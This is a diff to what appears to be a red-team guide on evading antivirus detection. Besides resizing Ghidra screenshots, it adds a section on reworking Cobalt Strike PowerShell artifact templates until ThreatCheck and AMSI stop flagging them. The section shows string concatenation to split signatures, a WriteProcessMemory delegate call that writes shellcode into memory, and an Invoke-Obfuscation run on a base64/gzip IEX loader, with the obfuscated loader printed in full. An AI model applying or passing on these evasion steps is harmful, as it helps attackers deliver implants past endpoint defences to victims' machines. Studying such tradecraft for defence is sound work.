@@ -103,11 +103,11 @@ ghidraRun.bat
 
 2. Import File  
 
-<img src="/images/ghidra02.png" width=600>  
+<img src="/images/ghidra02.png" width=400>  
 
 3. Double Click to open imported file
 
-<img src="/images/ghidra03.png" width=600>  
+<img src="/images/ghidra03.png" width=400>  
 
 4. Analyze the file, yes all. Use offset provided by ***ThreatCheck*** and copy to Navigation Menu - Go to ...  
 
@@ -119,11 +119,11 @@ file(0x9CF)
 
 5. See the reversed code decompiled on right window that is detected by Defender Antivirus.  
 
-<img src="/images/ghidra05.png" width=600>  
+<img src="/images/ghidra05.png" width=800>  
 
 6. Back to output from ***ThreatCheck***, copy last row of HEX bytes. In Ghidra open `Search Menu - Memory`. Then paste HEX bytes and click found memory location to take us to detected bit.  
 
-<img src="/images/ghidra06.png" width=600> 
+<img src="/images/ghidra06.png" width=700> 
 
 7. The function in this case for loop is confirmed to be location detected by antivirus. Using this identified function we go into our source code.
 
@@ -138,11 +138,50 @@ file(0x9CF)
 >Now repeat above by start with building new set of artifacts templates, and running ***ThreatCheck*** again.    
 >Repeat until ***ThreatCheck*** shows no threat found.  
 
-## Artifact Kit  
+## Script Artifacts Kit  
+
+>Building a new set of resources, without changing anything  
 
 ```
-
+./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
 ```  
 
+>Scanning template with ThreatCheck's AMSI engine  
+
+```ps1
+.\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
+```
+
+>Based on ThreatCheck output, simple String concatenation attempt in source code change.  
+
+```ps1
+('Syst'+'em.dll')
+```  
+
+>ThreatCheck next detection, shows marshal.copy method flagged and replace with native write process memory API.  
+
+```ps1
+$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
+$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
+```  
+
+>ThreatCheck misses different parts of code evaluation, use ***obfuscation***  
+>[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)  
+
+>Set the script block to be that of `compress.ps1` content.  
+
+```
+Invoke-Obfuscation> SET SCRIPTBLOCK '$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
+```  
+
+>token obfuscations result output:  
+
+```
+SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
+```  
+
+>Overwrite the content in `compress.ps1`, save the changes, then host and test a new payload.  
+
+## Beacon Memory  
 
 
